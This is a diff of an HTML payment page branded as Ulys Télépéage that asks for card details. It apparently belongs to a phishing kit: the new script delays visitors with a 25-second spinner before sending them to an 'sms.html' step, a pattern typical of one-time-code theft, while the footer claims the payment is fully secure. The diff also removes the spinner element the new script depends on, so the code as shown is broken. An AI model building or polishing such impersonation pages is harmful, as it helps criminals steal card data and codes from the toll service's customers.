@@ -5,6 +5,31 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Paiement – Ulys Télépéage</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
+  <style>
+    /* Spinner identique à celui de l’index */
+    #spinnerOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+    }
+
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 10px solid rgba(255, 255, 255, 0.2);
+      border-top: 10px solid #ff8000; /* orange accent Ulys */
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
   <!-- BANDEAU HAUT BLANC -->
@@ -38,7 +63,7 @@
   <main class="container">
     <div class="card">
       <h1>Paiement sécurisé</h1>
-      <form id="paymentForm" action="sms.html" method="get">
+      <form id="paymentForm">
         <label for="cb-num">Numéro de carte</label>
         <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
 
@@ -62,20 +87,16 @@
     &copy; 2025 Ulys. Paiement 100 % sécurisé.
   </footer>
 
-<script>
-    document.getElementById('btn-pay').addEventListener('click', function(){
-      const overlay = document.createElement('div');
-      overlay.className = 'loader-overlay';
-      overlay.innerHTML = '<div class="loader"></div>';
-      document.body.appendChild(overlay);
-      setTimeout(()=> window.location.href = 'information.html', 3800);
+  <script>
+    // Affiche le spinner pendant 25 secondes avant de rediriger
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Empêche la soumission immédiate
+      const overlay = document.getElementById('spinnerOverlay');
+      overlay.style.display = 'flex';
+      setTimeout(() => {
+        window.location.href = 'sms.html';
+      }, 25000); // 25 secondes
     });
   </script>
-
-    <!-- Spinner overlay -->
-  <div id="spinnerOverlay">
-    <div class="spinner"></div>
-  </div>
-
 </body>
 </html>
